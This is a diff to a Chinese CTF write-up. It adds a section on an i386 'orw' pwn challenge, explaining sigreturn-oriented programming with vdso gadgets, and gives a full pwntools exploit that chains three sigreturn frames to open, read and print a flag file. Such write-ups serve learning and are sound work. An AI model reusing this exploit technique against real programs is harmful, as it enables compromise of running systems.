@@ -9,9 +9,9 @@
 
 栈溢出题目，`sub_11C9()` 可以栈溢出，只修改返回地址的 1 字节，可以做到 partial overwrite 无限循环 `sub_11C9()` 读入 payload。
 
-这里讲一下 `fread`，后面也会用到。
+这里讲一下 `fread` 等 FILE 相关函数，后面也会用到。
 
-[[C 语言 fread1 函数特性]]
+[[C 语言 FILE 函数]]
 
 既然没有空字符阶段，printf 就会把 retaddr 打印出来，从而获得 pie base。
 
@@ -209,4 +209,103 @@ feed(b"1FFFF", -0x4fc+5)
 io.interactive()
 ```
 
+## strange
+
+> [Inferno] strange!?
+>
+> I heard you're good at orw? Give this a try!
+> 
+> PS:
+This is not the kernel! This is not the kernel! This is not the kernel! But debugging techniques used for the kernel can be employed for debugging. Pay attention to subtle differences caused by local and system kernel versions!
+
+题目给了 qemu 启动脚本和一个内核文件系统，看看里面的 hello，发现是个没用调用任何库函数的 i386 程序，只开了 NX，提示打 orw。
+
+问题是程序本身的 gadgets 非常少。
+
+这里提一下 SROP，这里需要提一下，`sigreturn` 这个系统调用和别的系统调用有一个不同的地方，即一般的应用程序不会主动调用它，而是由内核将相应地址填到栈上，使得应用进程被动地调用。因此在系统中一般会有一段代码专门用来调用`sigreturn`，在不同的类UNIX系统中，这段代码会出现在不同的位置，如下图所示：
+
+![](https://pic.imgdb.cn/item/6735971bd29ded1a8c516119.png)
+
+所以可以在这个 hello 程序的 vdso 里找到相当多的 gadgets。
+
+有一个点是 SROP 时需要把段寄存器设置正常，不然程序在系统调用的时候会 down 掉，一开始的时候不知道这个一直打不通闹麻了。
+
+```python
+from pwn import *
+from sys import argv
+
+proc = "./hello"
+context.log_level = "debug"
+context.binary = proc
+context.arch = 'i386'
+elf = ELF(proc, checksec=False)
+io = remote("", ) if argv[1] == 'r' else process(proc)
+
+if args.G:
+    gdb.attach(io)
+
+vdso_addr = 0xf7ffc000
+stack_addr = 0xffffccbc
+int_0x80 = vdso_addr + 0x00000577
+read_addr = 0x8049000
+sigreturn_addr = vdso_addr + 0x00000591
+resigreturn_addr = vdso_addr + 0x5a0
+ret_addr = vdso_addr + 0x0000057c
+
+io.recvuntil("!\n")
+
+frame = SigreturnFrame(kernel='i386')
+frame.eax = 5 # open
+frame.ebx = stack_addr
+frame.ecx = 0
+frame.edx = 0
+frame.ebp = 0
+frame.eip = int_0x80
+frame.esp = stack_addr + 0x24 + 80
+
+# 段寄存器要恢复
+frame.cs = 35
+frame.ss = 43
+frame.ds = 43
+frame.es = 43
+frame.fs = 0
+frame.gs = 0
+
+frame2 = SigreturnFrame(kernel='i386')
+frame2.eax = 3 # read
+frame2.ebx = 3
+frame2.ecx = stack_addr + 0x200
+frame2.edx = 0x20
+frame2.eip = int_0x80
+frame2.esp = stack_addr + 0x24 + 80 + 4 * 3 + 4 + 80
+frame2.cs = 35
+frame2.ss = 43
+frame2.ds = 43
+frame2.es = 43
+frame2.fs = 0
+frame2.gs = 0
+
+frame3 = SigreturnFrame(kernel='i386')
+frame3.eax = 4 # write
+frame3.ebx = 1
+frame3.ecx = stack_addr + 0x200
+frame3.edx = 0x20
+frame3.eip = int_0x80
+frame3.esp = stack_addr + 0x24 + 80 + 4 * 3 + 4 + 80 + 4 + 80
+frame3.cs = 35
+frame3.ss = 43
+frame3.ds = 43
+frame3.es = 43
+frame3.fs = 0
+frame3.gs = 0
+
+payload1 = b"./flag\x00".ljust(0x20, b"a") + p32(sigreturn_addr) + bytes(frame)
+payload1 += b"aaaa" + b"bbbb" + b"cccc"
+payload1 += p32(sigreturn_addr) + bytes(frame2)
+payload1 += b"aaaa" + b"bbbb" + b"cccc"
+payload1 += p32(sigreturn_addr) + bytes(frame3)
+io.sendline(payload1)
+
+io.interactive()
+```
 
